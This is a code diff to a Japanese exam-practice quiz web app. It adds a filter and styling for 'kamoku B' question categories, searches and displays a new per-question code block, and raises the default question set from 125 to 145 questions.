           activeClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-bold bg-amber-500 text-white whitespace-nowrap";
+        } else if (key === 'kamoku_b_all' || key.startsWith('kamoku_b_')) {
+          inactiveClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-semibold bg-indigo-500/10 text-indigo-600 dark:text-indigo-400 border border-indigo-500/30 whitespace-nowrap";
+          activeClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-bold bg-indigo-600 text-white whitespace-nowrap";
         }
 
         btn.className = (key === currentFilter) ? activeClass : inactiveClass;
@@ -2781,6 +3159,9 @@
         if (key === 'needs_review') {
           inactiveClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-semibold bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/30 whitespace-nowrap";
           activeClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-bold bg-amber-500 text-white whitespace-nowrap";
+        } else if (key === 'kamoku_b_all' || key.startsWith('kamoku_b_')) {
+          inactiveClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-semibold bg-indigo-500/10 text-indigo-600 dark:text-indigo-400 border border-indigo-500/30 whitespace-nowrap";
+          activeClass = "filter-btn px-2.5 py-1 rounded-lg text-xs font-bold bg-indigo-600 text-white whitespace-nowrap";
         }
 
         b.className = (key === currentFilter) ? activeClass : inactiveClass;
@@ -2802,6 +3183,8 @@
         list = [...allQuestions];
       } else if (currentFilter === 'needs_review') {
         list = allQuestions.filter(q => userStats.learning.has(q.id));
+      } else if (currentFilter === 'kamoku_b_all') {
+        list = allQuestions.filter(q => q.category && q.category.startsWith('kamoku_b_'));
       } else {
         list = allQuestions.filter(q => q.category === currentFilter);
       }
@@ -2813,6 +3196,7 @@
                  (q.summary && q.summary.toLowerCase().includes(searchQuery)) ||
                  (q.reasoning && q.reasoning.toLowerCase().includes(searchQuery)) ||
                  (q.categoryName && q.categoryName.toLowerCase().includes(searchQuery)) ||
+                 (q.code && q.code.toLowerCase().includes(searchQuery)) ||
                  (q.options && q.options.some(opt => opt.toLowerCase().includes(searchQuery)));
         });
       }
@@ -2855,6 +3239,8 @@
       document.getElementById('quick-hint-box').classList.add('hidden');
 
       if (filteredQuestions.length === 0) {
+        const cb = document.getElementById('q-code-block');
+        if (cb) cb.classList.add('hidden');
         if (currentFilter === 'needs_review') {
           document.getElementById('q-question-text').textContent = "現在「要復習」に指定された問題はありません！\n問題を解きながら「⚠️ まだあやふや」ボタンを押すと、ここに苦手問題だけが集まります。";
         } else if (searchQuery) {
@@ -2892,6 +3278,15 @@
       document.getElementById('current-q-index').textContent = currentIndex + 1;
       document.getElementById('total-filtered-count').textContent = filteredQuestions.length;
       document.getElementById('q-question-text').textContent = q.question;
+
+      const codeBlock = document.getElementById('q-code-block');
+      if (q.code && q.code.trim() !== '') {
+        codeBlock.textContent = q.code;
+        codeBlock.classList.remove('hidden');
+      } else {
+        codeBlock.textContent = '';
+        codeBlock.classList.add('hidden');
+      }
 
       document.getElementById('explanation-box').classList.add('hidden');
       document.getElementById('footer-nav').classList.remove('hidden');
@@ -3118,7 +3513,7 @@
     }
 
     function restoreDefaults() {
-      if (confirm('初期問題セット（最新全125問）に更新しますか？')) {
+      if (confirm('初期問題セット（最新全145問）に更新しますか？')) {
         allQuestions = [...defaultQuestions];
         userStats.mastered.clear();
         userStats.learning.clear();
